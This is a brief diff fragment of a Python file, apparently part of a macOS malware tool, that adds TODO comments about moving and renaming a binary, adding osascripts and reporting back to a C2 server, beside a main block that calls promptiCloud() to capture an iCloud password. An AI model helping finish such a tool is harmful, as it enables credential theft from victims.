@@ -75,6 +75,12 @@ def generateBinary(filelocation):
         return False
     return True
 
+# TODO:
+# Move the file to applications
+# change the file name
+# bring in the osascripts
+# return the response to the C2
+
 if __name__ == "__main__":
     icloudpass = promptiCloud()
     # print icloudpass
